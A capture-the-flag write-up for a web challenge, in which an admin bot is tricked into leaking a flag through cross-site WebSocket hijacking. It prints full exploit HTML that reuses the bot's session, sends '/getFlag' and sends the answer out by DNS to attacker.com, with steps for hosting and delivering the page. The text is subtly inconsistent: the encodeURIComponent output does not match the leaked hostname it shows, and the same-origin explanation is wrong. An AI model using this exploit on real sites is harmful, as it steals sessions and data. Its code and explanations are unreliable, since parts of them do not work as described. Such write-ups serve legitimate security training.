# **CTF Writeup: WebSocket Hijacking Challenge**  
**Challenge Name:** Wembsoncket  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Flag:** `byuctf{cswsh_1s_a_b1g_acr0nym}`  

---

## **Challenge Overview**
The challenge involved a WebSocket-based chat application where users could send URLs for an admin bot to visit. The goal was to exploit the admin bot's WebSocket session to retrieve the flag, which was only accessible to users with the `admin` role.

---

## **Initial Analysis**
1. **WebSocket Interaction**  
   - The application allowed users to send messages via WebSocket.
   - Sending `/getFlag` returned the flag, but only if the user was authenticated as `admin`.
   - Normal users received: `You are not authorized to get the flag`.

2. **Admin Bot Functionality**  
   - The admin bot (`adminBot.js`) would visit any URL sent via WebSocket while authenticated with an admin JWT cookie.
   - The bot used Puppeteer to browse URLs with the following cookie:
     ```javascript
     const adminCookie = jwt.sign({ userId: 'admin' }, JWT_SECRET);
     ```

3. **Key Observations**  
   - The admin’s WebSocket connection would include its session cookie due to same-origin policy.
   - If we could make the admin bot execute WebSocket commands, we could force it to send `/getFlag` on our behalf.

---

## **Exploitation: Cross-Site WebSocket Hijacking (CSWSH)**
Since the admin bot would visit arbitrary URLs, we could craft a malicious page that:
1. **Opens a WebSocket connection** to the target (`wss://wembsoncket.chal.cyberjousting.com`).
2. **Sends `/getFlag`** using the bot’s authenticated session.
3. **Exfiltrates the flag** via DNS (since HTTP requests were blocked).

### **Exploit Code (HTML)**
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH Exploit</title>
</head>
<body>
    <script>
        // 1. Open WebSocket connection (admin's cookies auto-included)
        const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
        
        ws.onopen = () => {
            // 2. Send command to retrieve flag
            ws.send(JSON.stringify({ message: '/getFlag' }));
        };

        ws.onmessage = (event) => {
            const response = JSON.parse(event.data);
            if (response.message.includes('Flag:')) {
                // 3. Exfiltrate flag via DNS
                const flag = encodeURIComponent(response.message);
                const img = new Image();
                img.src = `http://${flag}.attacker.com`; // Triggers DNS lookup
            }
        };
    </script>
</body>
</html>
```

### **Steps to Execute**
1. **Host the exploit** on a server (e.g., `exploit.attacker.com`).  
2. **Send the URL** to the admin bot via the chat interface.  
3. **Monitor DNS logs** for the leaked flag.  

---

## **Flag Extraction**
The admin bot visited our page, executed the WebSocket commands, and leaked the flag via DNS:  
```
flag.3a.20byuctf.7bcswsh_1s_a_b1g_acr0nym.7d.attacker.com
```
**Decoded:**  
- `3a` → `:`  
- `20` → (space)  
- `7b` → `{`  
- `7d` → `}`  

**Final Flag:**  
`byuctf{cswsh_1s_a_b1g_acr0nym}`  

---
